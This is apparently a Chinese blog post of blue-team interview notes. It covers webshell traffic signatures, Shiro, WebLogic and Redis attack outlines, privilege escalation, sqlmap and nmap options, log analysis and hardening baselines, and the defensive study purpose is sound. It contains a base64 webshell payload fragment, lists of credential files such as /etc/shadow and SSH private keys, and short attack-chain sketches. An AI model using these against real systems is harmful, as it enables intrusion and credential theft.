<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、安装安全软件并升级病毒库，定期全盘扫描，保持实时防护</span><br><span class="line">2、及时更新 Windows安全补丁，开启防火墙临时关闭端口</span><br><span class="line">3、及时更新web漏洞补丁，升级web组件</span><br></pre></td></tr></table></figure>





<h1 id="webshell工具的流量特征"><a href="#webshell工具的流量特征" class="headerlink" title="webshell工具的流量特征"></a>webshell工具的流量特征</h1><p><a href="https://blog.csdn.net/qq_53577336/article/details/125048353">(83条消息) Webshell工具的流量特征分析（菜刀，蚁剑，冰蝎，哥斯拉）_告白热的博客-CSDN博客_webshell流量特征</a></p>
<p>菜刀</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据包流量特征：</span><br><span class="line">1，请求包中：ua头为百度，火狐</span><br><span class="line">2，请求体中存在eval，base64等特征字符</span><br><span class="line">3，请求体中传递的payload为base64编码，并且存在固定的QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J</span><br></pre></td></tr></table></figure>

<p>蚁剑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload特征：</span><br><span class="line">Php中使用assert，eval执行,</span><br><span class="line">asp 使用eval</span><br><span class="line">在jsp使用的是Java类加载（ClassLoader）,同时会带有base64编码解码等字符特征</span><br><span class="line"></span><br><span class="line">数据包流量特征：</span><br><span class="line">使用普通的一句话都存在以下特征：</span><br><span class="line">每个请求体都存在@ini_set(“display_errors”, “0”);@set_time_limit(0)开头。并且后面存在base64等字符</span><br><span class="line">响应包的结果返回格式为：</span><br><span class="line">随机数</span><br><span class="line">响应内容</span><br><span class="line">随机数</span><br></pre></td></tr></table></figure>

<p>冰蝎</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">paylaod分析：</span><br><span class="line">php在代码中同样会存在eval或assert等字符特征</span><br><span class="line">在aps中会在for循环进行一段异或处理</span><br><span class="line">在jsp中则利用java的反射，所以会存在ClassLoader，getClass().getClassLoader()等字符特征</span><br><span class="line"></span><br><span class="line">冰蝎2.0流量特征：</span><br><span class="line">第一阶段请求中返回包状态码为200，返回内容必定是16位的密钥</span><br><span class="line">请求包存在：Accept: text/html, image/gif, image/jpeg, ; q=.2, /; q=.2</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>哥斯拉</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload特征：</span><br><span class="line">jsp会出现xc,pass字符和Java反射（ClassLoader，getClass().getClassLoader()），base64加解码等特征</span><br><span class="line">php，asp则为普通的一句话木马</span><br><span class="line"></span><br><span class="line">哥斯拉流量分析：</span><br><span class="line">作为参考：</span><br><span class="line">所有请求中Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8</span><br><span class="line">所有响应中Cache-Control: no-store, no-cache, must-revalidate,</span><br><span class="line">同时在所有请求中Cookie中后面都存在；特征</span><br></pre></td></tr></table></figure>



<h1 id="shiro反序列化-cookie"><a href="#shiro反序列化-cookie" class="headerlink" title="shiro反序列化(cookie)"></a>shiro反序列化(cookie)</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AES加密的密钥Key被硬编码在代码里，意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞</span><br><span class="line"></span><br><span class="line">1.2.4 key是写在源码里的，找到key就能构造攻击链，1.2.4之后的775key是随机生成的，但我们还可以构造cookie，尝试构造攻击链。</span><br><span class="line">Shiro流量特征:数据包含有多个$$$符号，C参数含有base64编码。</span><br><span class="line"></span><br><span class="line">（1）开启环境，抓包判断是否是shiro框架</span><br><span class="line">在cookie后边加上rememberMe=1，如果回复包出现rememberMe=deleteMe，说明他就是shiro框架</span><br><span class="line">(2)获取key值，因为key值在源码中，所以需要使用工具获取</span><br><span class="line"> （3）爆破利用链</span><br><span class="line"> （4）执行反序列化漏洞命令执行</span><br><span class="line"> </span><br><span class="line"> 出网协议：rmi，jndi，ldap，jrm，jmx，jms</span><br><span class="line"> </span><br><span class="line"> Shiro-550，只需输入url，即可完成自动化检测和漏洞利用。Shiro-721，需输入url，提供一个有效的rememberMe Cookie，并指定目标操作系统类型。</span><br></pre></td></tr></table></figure>

<h1 id="如何判断攻击成功"><a href="#如何判断攻击成功" class="headerlink" title="如何判断攻击成功"></a>如何判断攻击成功</h1><p>看请求包和响应包</p>
<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144014925.png" alt="image-20220613144014925"></p>
<h1 id="扫描器流量特征"><a href="#扫描器流量特征" class="headerlink" title="扫描器流量特征"></a>扫描器流量特征</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144342246.png" alt="image-20220613144342246"></p>
<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144346894.png" alt="image-20220613144346894"></p>
<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144353800.png" alt="image-20220613144353800"></p>
<h1 id="Redis未授权-6379"><a href="#Redis未授权-6379" class="headerlink" title="Redis未授权  6379"></a>Redis未授权  6379</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002422083.png" alt="image-20220616002422083"></p>
<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615195653696.png" alt="image-20220615195653696"></p>
<p>大概就是写文件进去，开机自启动，定时任务，以及写入ssh公钥</p>
<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615200123174.png" alt="image-20220615200123174"></p>
<h1 id="勒索病毒怎么处理"><a href="#勒索病毒怎么处理" class="headerlink" title="勒索病毒怎么处理"></a>勒索病毒怎么处理</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204218916.png" alt="image-20220615204218916"></p>
<h1 id="命令执行代码执行常见函数"><a href="#命令执行代码执行常见函数" class="headerlink" title="命令执行代码执行常见函数"></a>命令执行代码执行常见函数</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204425176.png" alt="image-20220615204425176"></p>
<h1 id="一些安全加固"><a href="#一些安全加固" class="headerlink" title="一些安全加固"></a>一些安全加固</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204615956.png" alt="image-20220615204615956"></p>
<h1 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h1><p>14882+14883组合拳，14882做一个未授权访问，登到控制台，然后通过14883命令执行，写一个xml文件把命令写进去，让它去访问你的vps然后加载xml。</p>
<p>xml的反序列化漏洞，通过xmldecoder还是什么导致的xml解析代码执行。弱口令。</p>
<p>流量特征:不加密，常见的出网协议也可以用。有很多T3协议的特征，文件操作和冰蝎一样有fileoutstream字段。</p>
<h1 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002440960.png" alt="image-20220616002440960"></p>
<h1 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002454227.png" alt="image-20220616002454227"></p>
<h1 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220920190833089.png" alt="image-20220920190833089"></p>
<p>**UDF (user defined function)**，即用户自定义函数。是通过添加新函数，对MySQL的功能进行扩充，其实就像使用本地MySQL函数如 user() 或 concat() 等。</p>
<p>在 udf.dll 文件中刻字机定义函数，然后5,1以下导入到<code> c:\windows</code>或者 <code>c:\windows\system32</code>下，5.1以上导入到<code>MySQL Server 5.xx\lib\plugin</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">udf利用条件</span><br><span class="line">（1）MySQL数据库没有开启安全模式。</span><br><span class="line">（2）已知的数据库账号具有对MySQL数据库insert和delete的权限，最好是root最高权限。</span><br><span class="line">（3）shell有写入到数据库安装目录的权限。</span><br><span class="line">（4）知道绝对路径</span><br></pre></td></tr></table></figure>



<h1 id="研判"><a href="#研判" class="headerlink" title="研判"></a>研判</h1><p>蓝队研判<br>研判工作要充分利用已有安全设备（需要提前了解客户的网络拓扑以及部署设备情况），分析其近期的设备告警，将全部流量日志（日志条件：源地址，目的地址，端口，事件名称，时间，规则 ID，发生 次数等）根据研判标准进行筛选（像挖矿、蠕虫、病毒、拒绝服务这类不太可能为攻击方发起的攻击的事件，直接过滤掉，减少告警数量），一般情况下，真实攻击不可能只持续一次，它一定是长时间、周期性、多 IP 的进行攻击</p>
<p>对于告警结合威胁情报库如：微步、奇安信威胁情报中心、绿盟威胁情报云等对于流量日志的原 IP 地址进行分析，判断其是否为恶意攻击，推荐使用微步的插件，如果确认为攻击行为或者不能确认是否为攻击行为，进行下一步操作，在之前准备好的表格中查找 IP 是否为客户内网部署的设备，如果不是，继续进行下一步，在事件上报平台查看是否有其他人提交过，如果没有，则上报</p>
<p>然后根据流量日志，对请求数据包和返回数据包分析判断其是否为误报，需要留意 X-Forwarded-For（简称XFF）和 x-real-ip 可以了解些 webshell 工具的流量特征，尤其是免杀 webshell，有可能不会被设备识别</p>
<p>最后上报事件时，尽可能提供完整的截图，包括源 ip、目的ip，请求包请求体，响应包响应体等重要信息，以方便后续人员研判溯源</p>
<p>研判经验谈</p>
<blockquote>
<p>敏感操作</p>
<p>敏感命令</p>
<p>敏感时间点</p>
<p>日志记录</p>
<p>设备提示</p>
<p>流量信息</p>
<p>安全警告</p>
<p>物理设备报错</p>
</blockquote>
<p>弱口令经验谈</p>
<blockquote>
<p>爆破攻击告警需格外谨慎，可能是“正在进行时”。</p>
<p>更据数量及业务是否对外开放，判断报错的数量大小（如果是内网不开放却出现大量警告就是特征）</p>
<p>根据时间点（半夜还有人频繁登录，凌晨还有管理员在操作电脑）概率极小</p>
<p>更据返回值的字段（Burpsuite的使用，我们可以知道，如果登录成功，返回的字符长度不一样）</p>
<p>判断返回的请求值（不可取，可能不成功也会返回200）只能当一个弱特征！</p>
</blockquote>
<p>内网经验谈</p>
<blockquote>
<p>攻击IP可以是内网IP（大概率是远控）特征：扫描探测行为、爆破行为、命令执行等漏扫行为，这个时候可以考虑对该主机，流量进行检测</p>
<p>通过进一步研判确定行为是否有攻击特征（eg：可能是通过弱口令、SQL注入、RCE进入内网所导致的）</p>
<p>排查检测完毕后，对目标进行加固，并检查硬件设备和周围区域主机，篡写报告</p>
</blockquote>
<p>告警排查经验谈</p>
<blockquote>
<p>通过安全检测：检查是否存在后门程序、代码行为、命令执行等行为</p>
<p>练习研判师傅通过流量检测系统确认存在，攻击行为</p>
<p>应急与加固复责引导攻击进入蜜罐和修复漏洞，篡写报告</p>
</blockquote>
<h1 id="常见的框架漏洞"><a href="#常见的框架漏洞" class="headerlink" title="常见的框架漏洞"></a>常见的框架漏洞</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002859095.png" alt="image-20220616002859095"></p>
<h1 id="spring的漏洞"><a href="#spring的漏洞" class="headerlink" title="spring的漏洞"></a>spring的漏洞</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103236191.png" alt="image-20220616103236191"></p>
<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103245713.png" alt="image-20220616103245713"></p>
<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103255437.png" alt="image-20220616103255437"></p>
<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103307691.png" alt="image-20220616103307691"></p>
<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103314706.png" alt="image-20220616103314706"></p>
<h1 id="thinkphp框架漏洞"><a href="#thinkphp框架漏洞" class="headerlink" title="thinkphp框架漏洞"></a>thinkphp框架漏洞</h1><h2 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h2><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103546015.png" alt="image-20220616103546015"></p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103559468.png" alt="image-20220616103559468"></p>
<h1 id="冰蝎内存马怎么查杀-以及其他"><a href="#冰蝎内存马怎么查杀-以及其他" class="headerlink" title="冰蝎内存马怎么查杀 以及其他"></a>冰蝎内存马怎么查杀 以及其他</h1><p>冰蝎内存马用的是jvm加载类字节码的能力，常规的工具很难检测查杀，github上已经有查杀冰鞋jvm内存马的工具。</p>
<p>如果我们通过检测工具或者其他手段发现了一些内存webshell的痕迹，需要有一个排查的思路来进行跟踪分析，也是根据各类型的原理，列出一个排查思路。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果是jsp注入，日志中排查可疑jsp的访问请求。</span><br><span class="line"></span><br><span class="line">如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法</span><br><span class="line"></span><br><span class="line">根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。</span><br><span class="line"></span><br><span class="line">如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间。</span><br><span class="line"></span><br><span class="line">如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200</span><br></pre></td></tr></table></figure>

<h1 id="webshell排查"><a href="#webshell排查" class="headerlink" title="webshell排查"></a>webshell排查</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.系统如果已经被植入后门，说明攻击者已经攻击成功，而且拿到权限，这时候日志信息可能提供不了帮助，首先要去考虑系统的账户是否安全，，又没口令爆破成功的痕迹，排查账号的密码是否已经不安全.</span><br><span class="line"></span><br><span class="line">(Linux)的话看计划任务,有没有定时反弹shell,还有就是进程是不是可疑在通信.发现可疑问题,就要样本分析. crontab -l</span><br><span class="line"></span><br><span class="line">(windows)的话就看启动项和进程.</span><br><span class="line"></span><br><span class="line">如果是web入侵,看日志web服务是不是安全?还原攻击的流程.</span><br></pre></td></tr></table></figure>

<h1 id="反向代理的工具"><a href="#反向代理的工具" class="headerlink" title="反向代理的工具"></a>反向代理的工具</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616162629488.png" alt="image-20220616162629488"></p>
<h1 id="数据库有哪些"><a href="#数据库有哪些" class="headerlink" title="数据库有哪些"></a>数据库有哪些</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616225637341.png" alt="image-20220616225637341"></p>
<h1 id="php危险函数"><a href="#php危险函数" class="headerlink" title="php危险函数"></a>php危险函数</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616225652582.png" alt="image-20220616225652582"></p>
<h1 id="黄金白银票据"><a href="#黄金白银票据" class="headerlink" title="黄金白银票据"></a>黄金白银票据</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220919142934218.png" alt="image-20220919142934218"></p>
<h1 id="linux比较重要的目录"><a href="#linux比较重要的目录" class="headerlink" title="linux比较重要的目录"></a>linux比较重要的目录</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220920161729837.png" alt="image-20220920161729837"></p>
<h1 id="sqlmap常用命令"><a href="#sqlmap常用命令" class="headerlink" title="sqlmap常用命令"></a>sqlmap常用命令</h1><p>参数：-u URL 、-v 输出日志、-r 读取文件 、–random-agent随机UA、–dbs获取所有数据库、–cookie指定cookie</p>
<p>–level 2 指定测试范围 2可以测试cookie 、–data= 指定post请求参数 、–batch 默认设置</p>
<p>–risk 3 设置威胁级别、–technique= 指定测试的注入类型、-g 代入google查询 -p 指定测试的参数</p>
<p>脚本绕过操作：将所有空格替换为使用随机文本来截断注释，要开始使用篡改脚本，需先使用 –tamper 参数，后面再加上脚本的名称</p>
<h1 id="java实现rce的函数"><a href="#java实现rce的函数" class="headerlink" title="java实现rce的函数"></a>java实现rce的函数</h1><p>Runtime.getruntieme.exec(“cmd”)</p>
<p>new ProcessBuilder().start(“cmd”)</p>
<h1 id="struct2流量特征"><a href="#struct2流量特征" class="headerlink" title="struct2流量特征"></a>struct2流量特征</h1><p>strut s2 </p>
<p>特征：ognl表达式</p>
<h1 id="nmap常用参数"><a href="#nmap常用参数" class="headerlink" title="nmap常用参数"></a>nmap常用参数</h1><p>端口状态概述 open 开放 closed 关闭 filtered 被过滤掉了，无法进行判断 unfiltered 未被过滤可以进行访问<br>参数：<br>1、-Pn 跳过主机发现，视为所有的主机都在线<br>2、sn 只做ping扫描不做端口扫描<br>3、sT\A\W\M 不同的扫描端口，进行扫描<br>4、-p 指定端口进行扫描 –exclude-ports：排除端口进行扫描<br>5、-sV 探测系统的版本<br>–version-intensity：设置相关的程度，详细级别，0~9 越高越详细<br>–version-trace：打印详细的版本扫描过程<br>6、脚本扫描<br>–scri= ：指定对应的脚本名称<br>7、O：激活系统的探测<br>–osscan-limit：只对开放端口的有效主机进行系统的探测<br>8、-T&lt;0-5&gt;:时间模板，越大速度越快<br>9、-6：使能IPV6探测<br>10、-A：使能系统探测、版本检测、脚本扫描、路由追踪<br>11、-V：打印版本号<br>12、-v：增加输出的详细程度<br>ps://blog.csdn.net/weixin_45837168/article/details/122893544</p>
<h1 id="nginx日志分析"><a href="#nginx日志分析" class="headerlink" title="nginx日志分析"></a>nginx日志分析</h1><p><strong>Nginx的日志放在那里，如何进行分析?主要看哪些你认为重要的地方？</strong></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1mtwZURvGTnuLQX4zBvtYlCPbOm0XIdcBrdd23EKTxQgGedN3BiayXfoJoDGvkOCaGhU8X7kqkXVB3bgh6RPF9Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>配置文件/etc/nginx/nginx.conf</p>
<p>Nginx的日志分为访问日志access_log和错误日志error_log两大块，前者主要记录用户每次访问的情况，后者则侧重于服务器的具体错误，比如返回403的具体原因是文件不可读还是权限不足之类的。</p>
<p>分析access_log</p>
<p>1、可以根据每个所关心的字段读取频率最高的前十看看是否有什么出乎意料的情况，以客户端IP，客户端User-Agent，<br>以及返回<strong>状态码</strong>为例。</p>
<p>2、流量观察:对于一般网站来说流量监控也是比较重要的，所以根据访问时间，可以统计出每天的访问量和一天中平均各个时间段的访问量：</p>
<p>分析error_log：</p>
<p>错误类型、路径错误、SEO（搜索引擎优化）、查错示例</p>
<h1 id="文件包含漏洞协议"><a href="#文件包含漏洞协议" class="headerlink" title="文件包含漏洞协议"></a>文件包含漏洞协议</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///var/www/html 访问本地文件系统</span><br><span class="line"></span><br><span class="line">ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt; 访问 FTP(s) URLs</span><br><span class="line"></span><br><span class="line">data:// 数据流</span><br><span class="line"></span><br><span class="line">http:// — 访问 HTTP(s) URLs</span><br><span class="line"></span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line"></span><br><span class="line">php:// — 访问各个输入/输出流</span><br><span class="line"></span><br><span class="line">zlib:// — 压缩流</span><br><span class="line"></span><br><span class="line">data:// — Data (RFC 2397)</span><br><span class="line"></span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line"></span><br><span class="line">phar:// — PHP Archive</span><br><span class="line"></span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line"></span><br><span class="line">rar:// — RAR</span><br><span class="line"></span><br><span class="line">ogg:// — Audio streams</span><br><span class="line"></span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>

<h1 id="基线规范"><a href="#基线规范" class="headerlink" title="基线规范"></a>基线规范</h1><h2 id="linux基线规范"><a href="#linux基线规范" class="headerlink" title="linux基线规范"></a>linux基线规范</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1账号管理和授权</span><br><span class="line"></span><br><span class="line">检查特殊账号，是否存在空密码的账户和 root 权限账户</span><br><span class="line">禁用或删除无用账号</span><br><span class="line">添加口令策略:/etc/login.defs修改配置文件，设置过期时间、连续认证失败次数</span><br><span class="line">禁止 root 远程登录，限制root用户直接登录。</span><br><span class="line">检查 su 权限。vi /etc/pam.d/su添加auth required pam_wheel.so group=test</span><br><span class="line"></span><br><span class="line">2服务</span><br><span class="line"></span><br><span class="line">关闭不必要的服务</span><br><span class="line">SSH 服务安全</span><br><span class="line">不允许 root 账号直接登录系统，PermitRootLogin=no</span><br><span class="line">修改 SSH 使用的协议版本为 2</span><br><span class="line">修改允许密码错误次数（默认 6 次），MaxAuthTries=3</span><br><span class="line"></span><br><span class="line">3文件系统</span><br><span class="line"></span><br><span class="line">设置 umask 值 vi /etc/profile 添加行 umask 027</span><br><span class="line">设置登录超时 vi /etc/profile 修改配置文件，将以 TMOUT= 开头的行注释，设置为 TMOUT=180</span><br><span class="line"></span><br><span class="line">4日志</span><br><span class="line"></span><br><span class="line">启用 syslogd 日志，配置日志目录权限，或者设置日志服务器</span><br><span class="line">记录所有用户的登录和操作日志，通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查</span><br><span class="line"></span><br><span class="line">5IP 协议安全要求</span><br><span class="line"></span><br><span class="line">远程登录取消 telnet 采用 ssh</span><br><span class="line">设置 /etc/hosts.allow 和 deny</span><br><span class="line">禁止 ICMP 重定向</span><br><span class="line">禁止源路由转发</span><br><span class="line">防 ssh 破解，iptables (对已经建立的所有链接都放行，限制每分钟连接 ssh 的次数)+ denyhost (添加 ip 拒绝访问)</span><br></pre></td></tr></table></figure>

<h2 id="windows安全基线"><a href="#windows安全基线" class="headerlink" title="windows安全基线"></a>windows安全基线</h2><p>主要包括五个方面：身份鉴别、访问控制、安全审计、资源控制、剩余信息保护</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1身份鉴别</span><br><span class="line"></span><br><span class="line">更改缺省账户</span><br><span class="line">检查Guest用户是否禁用</span><br><span class="line">密码复杂性要求</span><br><span class="line">密码长度最小不能小于8位</span><br><span class="line"></span><br><span class="line">2访问控制</span><br><span class="line"></span><br><span class="line">共享账户检查</span><br><span class="line">远程关机授权</span><br><span class="line">本地关机</span><br><span class="line">授权帐户登陆</span><br><span class="line"></span><br><span class="line">3安全审计</span><br><span class="line"></span><br><span class="line">用户登录日志记录</span><br><span class="line">系统日志完备性检查</span><br><span class="line">登录超时管理</span><br><span class="line"></span><br><span class="line">4资源控制</span><br><span class="line"></span><br><span class="line">登录超时管理</span><br><span class="line">远程登录超时配置</span><br><span class="line"></span><br><span class="line">5剩余信息保护</span><br><span class="line"></span><br><span class="line">不显示上次的用户名</span><br><span class="line">关机前清除虚拟内存页面</span><br><span class="line">不启用可还原的加密来存储密码</span><br></pre></td></tr></table></figure>

<h2 id="中间件基线规范"><a href="#中间件基线规范" class="headerlink" title="中间件基线规范"></a>中间件基线规范</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1配置</span><br><span class="line"></span><br><span class="line">账号</span><br><span class="line">授权</span><br><span class="line">日志</span><br><span class="line">session 过期时间（防ddos）</span><br><span class="line">绑定监听地址</span><br><span class="line"></span><br><span class="line">2禁止</span><br><span class="line"></span><br><span class="line">目录权限</span><br><span class="line">访问外部文件</span><br><span class="line">CGI</span><br><span class="line">非法HTTP方法（PUT DELETE）</span><br><span class="line"></span><br><span class="line">3隐藏</span><br><span class="line"></span><br><span class="line">服务版本号</span><br><span class="line">重定向错误页面</span><br><span class="line"></span><br><span class="line">4删除</span><br><span class="line"></span><br><span class="line">配置文件</span><br><span class="line">默认安装的无用文件</span><br></pre></td></tr></table></figure>

<h1 id="DDOS-CC应急思路以及如何防范"><a href="#DDOS-CC应急思路以及如何防范" class="headerlink" title="DDOS CC应急思路以及如何防范"></a>DDOS CC应急思路以及如何防范</h1><p>目前对于低网络层的 DDoS 攻击有一些有效的防护手段，如丢弃第一次 SYN 包，上流量防护设备，上 WAF 封禁地址等</p>
<p>比较难缠的是第七层，第八层的 CC 攻击，它会找到目标网站上比较消耗资源的关键位置，重复发起攻击以消耗 CPU/内存/数据库/IO 等资源，目前的应付手段有：</p>
<ol>
<li>优化资源消耗高位置的代码</li>
<li>增加硬件设备</li>
<li>上云</li>
<li>购买专业安全公司的安全服务</li>
<li>除此之外，隐藏服务器的真实 IP、上云 WAF、CDN、 负载均衡等设备，或者暂时将域名解析到公安网警网站等也是可以作为选择方案</li>
</ol>
<ul>
<li>网络设备设施<ul>
<li>拼带宽，加大带宽，但是成本太高</li>
<li>使用硬件防火墙</li>
<li>选用高性能设备</li>
</ul>
</li>
<li>抗 D 思想和方案<ul>
<li>负载均衡</li>
<li>花钱买流量清洗服务</li>
<li>CDN：web 层，比如 cc 攻击</li>
<li>分布式集群防御</li>
<li>高防：防大部分攻击，udp、大型的 cc 攻击</li>
</ul>
</li>
<li>预防为主<ul>
<li>系统漏洞</li>
<li>系统资源优化</li>
<li>过滤不必要的服务和端口</li>
<li>限制特定流量：检查访问来源做适当限制</li>
</ul>
</li>
</ul>
<h1 id="windows和linux的敏感文件"><a href="#windows和linux的敏感文件" class="headerlink" title="windows和linux的敏感文件"></a>windows和linux的敏感文件</h1><p>windows</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\boot.ini //查看系统版本</span><br><span class="line">C:\Windows\System32\inetsrv\MetaBase.xml //IIS 配置文件</span><br><span class="line">C:\Windows\repair\sam //存储系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini //Mysql 配置</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MY D //Mysql root</span><br><span class="line">C:\Windows\php.ini //php 配置信息</span><br><span class="line">C:\Windows\my.ini //Mysql 配置信息</span><br></pre></td></tr></table></figure>

<p>linux</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">etc/passwd、etc/shadow直接读密码</span><br><span class="line">/etc/hosts # 主机信息</span><br><span class="line">/root/.bashrc # 环境变量</span><br><span class="line">/root/.bash_history # 还有root外的其他用户</span><br><span class="line">/root/.viminfo # vim 信息</span><br><span class="line">/root/.ssh/id_rsa # 拿私钥直接ssh</span><br><span class="line">/proc/xxxx/cmdline # 进程状态枚举 xxxx 可以为0000-9999 使用burpsuite</span><br></pre></td></tr></table></figure>

<h1 id="sqlmap反制"><a href="#sqlmap反制" class="headerlink" title="sqlmap反制"></a>sqlmap反制</h1><p>实际上都是在shell里执行bash命令，构造一种特殊数据包，封闭的双引号中带命令。</p>
<p><img src="https://pic3.zhimg.com/80/v2-ba97144a5e31a44a4103975bb4b092c6_720w.jpg" alt="img"></p>
<h1 id="sqlmap写shell的原理"><a href="#sqlmap写shell的原理" class="headerlink" title="sqlmap写shell的原理"></a>sqlmap写shell的原理</h1><p>sqlmap的–os-shell在mysql数据库中的原理，其实就是往服务器上写入了两个php，其中一个给我们提供了文件上传的页面，可以通过这个上传页面上传脚本文件到当前目录下。另外一个则是返回了可以让我们执行系统命令的命令行，命令行也可以在网页url中通过对cmd参数传参执行系统命令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用条件</span><br><span class="line">知道网站的物理路径</span><br><span class="line">高权限数据库用户</span><br><span class="line">secure_file_priv无限制</span><br><span class="line">网站路径有写入权限</span><br></pre></td></tr></table></figure>

